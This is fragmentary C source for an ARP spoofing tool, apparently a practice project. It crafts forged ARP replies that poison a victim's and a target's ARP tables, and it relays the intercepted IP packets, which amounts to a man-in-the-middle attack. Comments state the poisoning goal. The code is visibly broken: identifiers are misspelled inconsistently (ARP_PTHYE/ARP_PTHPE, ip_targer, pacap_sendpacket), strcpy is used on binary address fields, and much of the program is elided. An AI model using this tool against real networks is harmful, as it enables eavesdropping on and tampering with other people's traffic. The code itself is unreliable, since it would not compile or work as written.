...
#define ARP_PTHYE 0x0800 // Protocol type (IPv4: 0x0800) 
#define ARP_HLEN 0x06 // Hardware length (ETHERNET: 0x06)
#define ARP_PLEN 0x04 // Protocol length (IPv4: 0x04)
#define ARP_OPER_REQ 0x0001 // Operation code (request: 0x0001, reply: 0x0002)
#define ARP_OPER_REP 0x0002

void usage()
{
    printf("syntax: arp_spoof <interface> <sender ip> <target ip>\n");
    printf("sample: arp_spoof ens33 192.168.44.143 192.168.44.145");
}
...
int main (int argc, char * argv[])
{
    ...
    char * ip_sender_str = argv[2];
    char * ip_target_str = argv[3];
    char ip_sender[4];
    char ip_target[4];
    char ip_attacker[4];
...
/*************************************************************************************************/
    ...
    memcpy((ethernet_request->ether_shost), mac_attacker, 6);
    ethernet_request->ether_type = swap_word_endian(ETHERTYPE_ARP);

    arp_request->htype = swap_word_endian(ARP_HTYPE);
    arp_request->ptype = swap_word_endian(ARP_PTHPE);
    arp_request->hlen = ARP_HELN;
    arp_request->plen = ARP_PLEN;
    arp_request->oper = swap_word_endian(ARP_OPER_REQ);
    memcpy(arp_request->sha, mac_attacker, 6);
    strcpy(arp_request->spa, ip_attacker);
    strcpy(arp_request->tha, mac_target);
    strcpy(arp_request->tpa, ip_target);
/*************************************************************************************************/
    
    /*        Set Arp reply packet to sender      */
    ethernet_sender_reply = (struct sniff_ethernet*)arp_reply_sender_packet;
    arp_sender_reply = (struct sniff_arp*)(arp_reply_sender_packet+ETHER_LEN);

    strcpy((char*)(ethernet_sender_reply->ether_dhost), mac_sender);
    memcpy((ethernet_sender_reply->ether_shost), mac_attacker, 6);
    ...
    memcpy(arp_sender_reply->sha , mac_attacker, 6);
    strcpy(arp_sender_reply->spa, ip_target);
    strcpy(arp_sender_reply->tha, mac_sender);
    strcpy(arp_sender_reply->tpa, ip_sender);
/*************************************************************************************************/
    ...
    strcpy((char*)(ethernet_target_reply->ether_dhost) , mac_target);    // We have to get sender(victim) mac address by arp request
    ...
    strcpy(arp_target_reply->spa , ip_sender);                             // Poisoning victim's arp table (In victim arp table , target's mac address is changed to attacer's mac address) 
    strcpy(arp_target_reply->tha , mac_target);                            // We have to get sender(victim) mac address by arp request
    strcpy(arp_target_reply->tpa , ip_target);
/*************************************************************************************************/
    ...
    while (true)
    {
        ...
        arp = (struct sniff_arp*)(packet + ETHER_LEN);
        ip = (struct sniff_ip*)(packet + ETHER_LEN);

        int packet_size = swap_word_endian(ip->ip_len) + ETHER_LEN;
        ...
        if(arp_check(swap_word_endian(ethernet->ether_type))
            ...
            &&!memcmp(arp->spa, ip_sender, 4)
            &&!memcmp(arp->tha, mac_attacker, 6)
            &&!memcmp(arp->tpa, ip_attacker, 4))
            {
                memcpy(mac_sender, arp->sha, 6);
                memcpy((char*)(ethernet_sender_reply->ether_dhost), mac_sender, 6);
                memcpy(arp_sender_reply->tha, mac_sender, 6);
        ...
        if(arp_check(swap_word_endian(ethernet->ether_type))
            &&swap_word_endian(arp->oper) == ARP_OPER_REP
            &&!memcmp(arp->spa, ip_targer, 4)
            &&!memcmp(arp->tha, mac_attacker, 6)
            &&!memcmp(arp->tpa, ip_attacker, 4))
            {
                memcpy(mac_target, arp->sha, 6);
        ...
        if(!memcmp((char*)ethernet->ether_dhost, mac_attacker, 6)
            &&!memcmp((char*)ethernet->ether_shost, mac_sender, 6)
            &&ip_check(swap_word_endian(ethernet->ether_type)))
            {
                memcpy(ethernet->ether_shost, mac_attacker, 6);
                memcpy(ethernet->ether_dhost, mac_target, 6);
                printf("doing relay (sender)\n");
             
                if(pacap_sendpacket(handle, packet, packet_size)!=0) printf("Error with relay (sender)");
            }
